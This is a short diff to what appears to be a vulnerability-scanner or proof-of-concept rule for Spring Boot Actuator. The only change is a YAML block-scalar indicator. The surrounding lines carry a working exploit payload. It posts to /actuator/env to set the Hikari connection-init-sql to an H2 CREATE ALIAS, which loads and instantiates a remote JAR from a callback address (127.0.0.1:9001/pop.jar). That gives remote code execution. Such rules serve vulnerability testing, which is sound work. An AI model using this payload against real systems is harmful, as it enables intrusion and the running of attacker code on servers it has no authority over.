@@ -4,7 +4,7 @@ rules:
     path: /actuator/env
     headers:
       Content-Type: application/json
-    body: |-
+    body: |
       {
               "name": "spring.datasource.hikari.connection-init-sql",
               "value":"CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws Exception { Class.forName(\"pop\", true, new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:9001/pop.jar\")})).newInstance();return null;}$$; CALL remoteUrl()"
